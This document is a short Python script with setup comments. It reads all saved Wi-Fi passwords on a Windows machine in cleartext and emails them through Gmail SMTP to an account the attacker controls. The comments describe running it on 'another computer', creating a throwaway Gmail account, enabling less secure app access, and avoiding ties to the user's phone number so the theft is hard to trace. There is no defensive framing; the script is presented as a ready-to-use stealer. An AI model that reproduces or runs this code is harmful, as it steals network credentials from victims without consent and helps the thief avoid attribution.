#Before running this on another computer 
#1 make a fake gmail account
#2 https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjq75nmiqHzAhWbYisKHdBEA8EQFnoECAcQAQ&url=https%3A%2F%2Fmyaccount.google.com%2Flesssecureapps&usg=AOvVaw3FH1O5TwzTEB9B9yhEUsI7
# turn on less secure apps options for  your fake account
#4 scroll down to line 2 and change "youremail","yourpassword" with your fake email & password
#5 make sure to delete fake account after completion and dont make fake account with your number!
#6 Just run this python script on any windows os and 


import subprocess,smtplib


def sendmail(email,password,details):
	server=smtplib.SMTP("smtp.gmail.com",587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email,email,details)
	server.quit()
	
subprocess.run("cd %temp% && netsh wlan export profile key=clear && powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > VIRUS",shell=True)
result=subprocess.check_output("cd %temp% && type VIRUS",shell=True)


#your fake email password here
sendmail("YourEmail@gmail.com","YourPassword",result)
